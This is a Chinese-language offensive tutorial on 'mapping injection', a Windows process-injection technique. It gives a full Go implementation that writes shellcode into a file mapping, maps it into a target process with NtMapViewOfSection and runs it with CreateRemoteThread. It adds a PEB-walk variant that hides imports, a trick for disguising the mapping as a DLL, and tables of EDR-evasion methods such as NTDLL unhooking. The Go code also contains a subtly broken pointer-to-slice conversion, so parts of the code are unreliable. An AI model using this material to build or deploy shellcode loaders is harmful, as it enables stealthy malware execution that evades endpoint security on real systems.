# 映射注入（Mapping Injection）

## 原理

映射注入是一种通过内存映射文件（MemoryMapped File）将Shellcode注入到目标进程的技术。相比经典注入使用VirtualAllocEx+WriteProcessMemory，映射注入使用文件映射对象，更加隐蔽，可绕过某些EDR对WriteProcessMemory的监控。

**核心流程：**
1. 在当前进程创建文件映射对象
2. 将Shellcode写入映射内存
3. 将映射对象映射到目标进程
4. 创建远程线程执行映射内存中的Shellcode

**优势：**
- 不使用WriteProcessMemory，规避对该API的Hook监控
- 映射内存区域看起来像合法的内存映射文件
- 可与DLL文件映射混淆，降低检测率

---

## API调用流程

| 步骤 | API | 说明 |
|------|-----|------|
| 1 | CreateFileMapping | 创建文件映射对象 |
| 2 | MapViewOfFile | 在当前进程映射，写入Shellcode |
| 3 | OpenProcess | 打开目标进程 |
| 4 | MapViewOfFileEx / NtMapViewOfSection | 将映射对象映射到目标进程 |
| 5 | CreateRemoteThread | 创建远程线程执行 |

---

## Go实现（标准方式）

```go
package main

import (
    "golang.org/x/sys/windows"
    "unsafe"
)

func mappingInjection(pid uint32, sc []byte) error {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    ntdll := windows.NewLazySystemDLL("ntdll.dll")

    // 动态获取API（IAT隐藏）
    CreateFileMappingW := kernel32.NewProc("CreateFileMappingW")
    MapViewOfFile := kernel32.NewProc("MapViewOfFile")
    UnmapViewOfFile := kernel32.NewProc("UnmapViewOfFile")
    OpenProcess := kernel32.NewProc("OpenProcess")
    MapViewOfFileEx := kernel32.NewProc("MapViewOfFileEx")
    CreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
    CloseHandle := kernel32.NewProc("CloseHandle")
    NtMapViewOfSection := ntdll.NewProc("NtMapViewOfSection")

    // 1. 创建文件映射对象（匿名映射，不关联文件）
    // PAGE_EXECUTE_READWRITE = 0x40
    mapHandle, _, err := CreateFileMappingW.Call(
        0xFFFFFFFFFFFFFFFF, // INVALID_HANDLE_VALUE，匿名映射
        0,                   // 安全属性
        0x40,                // PAGE_EXECUTE_READWRITE
        0,                   // 高32位大小
        uintptr(len(sc)),    // 低32位大小
        0,                   // 名称（匿名）
    )
    if mapHandle == 0 {
        return err
    }

    // 2. 在当前进程映射，写入Shellcode
    // FILE_MAP_WRITE | FILE_MAP_READ = 0x2 | 0x4 = 0x6
    localAddr, _, err := MapViewOfFile.Call(
        uintptr(mapHandle),
        0x6,                // FILE_MAP_WRITE | FILE_MAP_READ
        0,
        0,
        uintptr(len(sc)),
    )
    if localAddr == 0 {
        CloseHandle.Call(uintptr(mapHandle))
        return err
    }

    // 3. 写入Shellcode到映射内存
    copy((*[]byte)(unsafe.Pointer(localAddr))[:len(sc)], sc)

    // 4. 打开目标进程
    // PROCESS_ALL_ACCESS = 0x1F0FFF
    processHandle, _, err := OpenProcess.Call(
        0x1F0FFF,
        0,
        uintptr(pid),
    )
    if processHandle == 0 {
        UnmapViewOfFile.Call(localAddr)
        CloseHandle.Call(uintptr(mapHandle))
        return err
    }

    // 5. 将映射对象映射到目标进程
    // 方式1：使用MapViewOfFileEx（指定目标地址）
    // 方式2：使用NtMapViewOfSection（更底层，推荐）

    var remoteAddr uintptr
    var viewSize uintptr = uintptr(len(sc))

    // NtMapViewOfSection参数
    // SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize,
    // SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect
    status, _, _ := NtMapViewOfSection.Call(
        uintptr(mapHandle),
        processHandle,
        uintptr(unsafe.Pointer(&remoteAddr)),
        0,
        0,
        0,
        uintptr(unsafe.Pointer(&viewSize)),
        2,  // VIEW_SHARE
        0,
        0x40, // PAGE_EXECUTE_READWRITE
    )
    if status != 0 {
        UnmapViewOfFile.Call(localAddr)
        CloseHandle.Call(uintptr(mapHandle))
        CloseHandle.Call(processHandle)
        return windows.NTStatus(status)
    }

    // 6. 创建远程线程执行
    threadHandle, _, err := CreateRemoteThread.Call(
        processHandle,
        0,
        0,
        remoteAddr,
        0,
        0,
        0,
    )

    // 7. 清理
    UnmapViewOfFile.Call(localAddr)
    CloseHandle.Call(uintptr(mapHandle))
    CloseHandle.Call(processHandle)
    if threadHandle != 0 {
        CloseHandle.Call(threadHandle)
    }

    return nil
}
```

---

## Go实现（使用NtMapViewOfSection + PEB Walk）

```go
package main

import (
    "unsafe"
)

// 通过PEB Walk获取API地址
func mappingInjectionPEBWalk(pid uint32, sc []byte) {
    // 获取模块基址
    kernel32Base := getModuleBase("kernel32.dll")
    ntdllBase := getModuleBase("ntdll.dll")

    // 通过导出表获取API地址
    createFileMappingW := getProcAddress(kernel32Base, "CreateFileMappingW")
    mapViewOfFile := getProcAddress(kernel32Base, "MapViewOfFile")
    openProcess := getProcAddress(kernel32Base, "OpenProcess")
    createRemoteThread := getProcAddress(kernel32Base, "CreateRemoteThread")
    closeHandle := getProcAddress(kernel32Base, "CloseHandle")
    ntMapViewOfSection := getProcAddress(ntdllBase, "NtMapViewOfSection")

    // 调用流程同上，使用syscall.SyscallN调用
    // ...
}
```

---

## 映射注入 vs 经典注入对比

| 特性 | 经典注入 | 映射注入 |
|------|----------|----------|
| 内存分配 | VirtualAllocEx | CreateFileMapping |
| 写入方式 | WriteProcessMemory | MapViewOfFile + copy |
| API Hook风险 | WriteProcessMemory常被Hook | 文件映射API监控较少 |
| 内存属性 | 可单独设置 | 映射时设置 |
| 检测难度 | 较易检测 | 较隐蔽 |
| 实现复杂度 | 简单 | 中等 |

---

## 进阶技巧

### 1. 伪装为DLL映射

创建与合法DLL大小相同的映射，降低异常检测：
```go
// 使用合法DLL文件创建映射
dllPath := "C:\\Windows\\System32\\kernel32.dll"
fileHandle := CreateFileW(dllPath, GENERIC_READ, ...)
mapHandle := CreateFileMappingW(fileHandle, ...)

// 映射后覆盖关键位置
```

### 2. 使用Section对象

直接使用NtCreateSection创建更底层的内存对象：
```go
NtCreateSection(
    &sectionHandle,
    SECTION_ALL_ACCESS,
    NULL,
    &maximumSize,
    PAGE_EXECUTE_READWRITE,
    SEC_COMMIT,
    NULL
)
```

### 3. 跨进程共享映射

两个进程映射同一Section对象，实现Shellcode共享：
```go
// 当前进程映射写入
localView := MapViewOfFile(mapHandle, ...)

// 目标进程映射读取执行
remoteView := NtMapViewOfSection(mapHandle, targetProcess, ...)
```

---

## 检测规避要点

| 检测点 | 规避方法 |
|--------|----------|
| WriteProcessMemory Hook | 使用文件映射替代 |
| 内存区域异常属性 | 使用合法DLL大小伪装 |
| 映射对象名称 | 使用匿名映射 |
| 执行入口点检测 | 使用NtCreateThreadEx替代CreateRemoteThread |

---

## 注意事项

1. **目标进程权限**：需要PROCESS_VM_OPERATION权限
2. **映射大小**：尽量与常见DLL大小接近
3. **清理映射**：执行完成后关闭映射句柄
4. **NTAPI优先**：NtMapViewOfSection比MapViewOfFileEx更隐蔽
5. **配合NTDLL脱钩**：目标进程NTDLL可能被Hook，考虑脱钩